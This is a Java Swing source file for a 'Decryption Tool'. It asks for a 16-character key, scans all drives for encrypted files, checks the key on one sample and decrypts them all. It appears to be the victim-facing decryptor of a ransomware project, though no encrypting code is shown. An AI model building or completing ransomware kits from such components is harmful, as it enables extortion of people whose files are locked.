package decryptionTool;

import encryptionAndDecryption.Decryption;
import enums.To;
import files.GetFiles;
import gui.Dialogs;
import helpers.FunctionsHelper;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.util.ArrayList;

public class Main {
    private static final String os = FunctionsHelper.getOs();

    public static void main(String[] args) {
        JFrame frame = new JFrame("Decryption Tool");
        // Set up the frame
        Container container = frame.getContentPane();
        GroupLayout groupLayout = new GroupLayout(container);
        frame.setLayout(groupLayout);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        groupLayout.setAutoCreateGaps(true);
        groupLayout.setAutoCreateContainerGaps(true);
        groupLayout.preferredLayoutSize(container);

        Font font = new Font("Serif", Font.PLAIN, 40);

        JLabel welcome = new JLabel("Welcome");
        JTextField keyField = new JTextField();
        JButton button = new JButton("Decrypt my files");

        // Set font
        welcome.setFont(font);
        keyField.setFont(font);
        button.setFont(font);

        // Set size
        button.setSize(button.getPreferredSize());

        // Add all components to the group layout
        groupLayout.setHorizontalGroup(
                groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
                        .addComponent(welcome)
                        .addComponent(keyField)
                        .addComponent(button)
        );
        groupLayout.setVerticalGroup(
                groupLayout.createSequentialGroup()
                        .addComponent(welcome)
                        .addComponent(keyField)
                        .addComponent(button)
        );

        frame.pack();
        frame.setVisible(true);

        // Button action listener
        button.addActionListener(listener -> {
            String key = keyField.getText();
            // Check key
            if (key.isEmpty())
                Dialogs.messageDialog("Please enter the key", "The key field is empty");
            else if (key.length() < 16)
                Dialogs.messageDialog("The length of the input key is small",
                        "The length of the inserted key is less than the required length");
            else if (key.length() > 16)
                Dialogs.messageDialog("The length of the input key is large",
                        "The length of the inserted key is getter than the required length");
            else {
                GetFiles getFiles = new GetFiles(os);
                // Get a sample to check
                File[] roots = getFiles.getDrivers();
                ArrayList<File> tempFiles = getFiles.scanFiles(roots[0], To.DECRYPTION, true);
                if (tempFiles.size() == 0) {
                    Dialogs.messageDialog("There is no encrypted file", "We did not find any encrypted file");
                    System.exit(1);
                } else {
                    File sampleFile = tempFiles.get(0);
                    // Verify that the key is correct
                    if (Decryption.check(key, sampleFile)) {
                        // Disable button
                        button.setEnabled(false);
                        // Decryption all files
                        Decryption.decryption(key, getFiles, roots);
                    } else {
                        Dialogs.messageDialog("Invalid key",
                                "The decryption key is incorrect, make sure you copied correctly and try again");
                    }
                }
            }
        });
    }
}
